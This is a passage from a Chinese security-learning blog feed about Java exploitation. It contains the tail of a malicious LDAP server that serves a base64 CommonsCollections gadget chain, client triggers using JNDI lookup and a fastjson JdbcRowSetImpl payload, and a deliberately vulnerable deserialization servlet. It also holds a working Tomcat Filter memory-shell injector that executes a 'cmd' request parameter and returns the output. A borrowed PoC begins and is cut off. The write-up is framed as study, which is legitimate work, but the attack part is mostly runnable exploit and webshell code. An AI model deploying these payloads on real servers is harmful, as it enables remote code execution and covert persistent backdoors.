SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line"> <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line"> System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line">  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment"> */</span> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line"> <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line"> System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line"> <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line"> <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// Payload2: 返回序列化Gadget  </span></span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (ParseException exception) &#123;  </span><br><span class="line">                exception.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码，这里有两种触发方式，一种lookup，还有一种fastjson</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIGadgetClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">// lookup参数注入触发  </span></span><br><span class="line"> <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> context.lookup(<span class="string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// Fastjson反序列化JNDI注入Gadget触发  </span></span><br><span class="line"> <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化打内存马</title>
    <url>/2025/04/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="r2cKF">Java反序列化打内存马</h1>
对于我们之前学习的Tomcat内存马，只算是做了一些简单的实验，并未能够完全应用，只能通过文件上传jsp的方式来注入内存马，也是存在文件落地的现象的，并非真正的内存马

<p>所以这篇文章，我们来学习利用反序列化来实现真正的内存马注入，本文会使用CC11链来进行内存马的注入，实现真正的无文件落地内存马，在使用 jsp 注入的时候由于 request 和 response 是 jsp 的内置对象，所以在回显问题上不用考虑，但是当我们结合反序列化进行注入的时候这些都成了需要考量的地方</p>
<h2 id="x1jLn">回显技术</h2>
回显技术已经在之前的文章中说过，常用就分为以下几类：

<ul>
<li>半通用Tomcat回显</li>
<li>Tomcat低版本全局存储回显</li>
<li>Tomcat高版本全局存储回显</li>
</ul>
<h2 id="CyvHE">反序列化注入内存马</h2>
<h3 id="gHRH3">低版本Tomcat注入内存马</h3>
来简单捋一下注入内存马的思路

<h4 id="Coove">漏洞环境</h4>
这里使用WebApp项目，且使用低版本Tomcat

<p>这里我们写一个简单的Servlet，模拟存在反序列化的点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sermemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/cc&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (InputStream) req;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> req.getInputStream();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="E769y">半通用回显</h4>

<p>这里使用Tomcat半通用回显，具体内容看<strong>Java回显技术</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.EXP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> f.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(f.getBoolean(<span class="literal">null</span>) == Boolean.FALSE)&#123;</span><br><span class="line">                f.setBoolean(<span class="literal">null</span>,Boolean.TRUE);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            f = c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            modifiersField = f.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (f.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                f.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            f = c.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            modifiersField = f.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (f.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                f.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="wP8E6">内存马注入</h4>

<p>这里以Filter内存马为示例，获取 request 和 response，将命令执行结果写入response</p>
<h5 id="sXJn9">自写POC</h5>

<p>跟着师傅的博客，自己翻阅着笔记，写出来这么一个东西T^T，对于搭建的漏洞环境，起码是可以注入了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.EXP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName=<span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrl</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String filterName=<span class="string">&quot;Sean&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">            <span class="keyword">if</span> (servletContext != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">ctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                ctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) ctx.get(servletContext);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(appctx);</span><br><span class="line">                <span class="keyword">if</span> (standardContext != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">TomcatInject</span> <span class="variable">cmdFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TomcatInject</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="type">FilterDef</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                    def.setFilterName(filterName);</span><br><span class="line">                    def.setFilter(cmdFilter);</span><br><span class="line">                    def.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line">                    <span class="type">FilterMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                    map.setFilterName(filterName);</span><br><span class="line">                    map.addURLPattern(filterUrl);</span><br><span class="line"></span><br><span class="line">                    standardContext.addFilterDef(def);</span><br><span class="line">                    standardContext.addFilterMapBefore(map);</span><br><span class="line">                    standardContext.filterStart();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletContext  <span class="title function_">getServletContext</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">            servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> servletRequest.getServletContext();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(cmdParamName);</span><br><span class="line">            <span class="keyword">if</span> (cmd!= <span class="literal">null</span> &amp;&amp; cmd != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">stream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(stream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                writer.write(s);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="InvRW">拿来拿来</h5>

<p>这里就借用DrunkBaby师傅的POC，还是DrunkBaby的全面，对于很多东西考虑感觉是我达不到的高度了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> EXP;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am  </span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">    